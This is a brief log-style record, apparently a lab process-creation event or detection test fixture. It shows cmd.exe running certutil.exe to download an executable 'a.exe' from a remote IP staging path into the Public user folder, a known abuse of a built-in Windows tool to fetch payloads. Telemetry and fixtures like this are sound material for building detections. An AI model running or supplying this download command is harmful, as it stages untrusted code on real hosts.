    image: C:\Windows\System32\certutil.exe
    cmd: certutil.exe -urlcache -split -f http://203.0.113.45/stage/a.exe C:\Users\Public\a.exe
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\erin
    dest_ip: null
    dest_port: null
    name: null
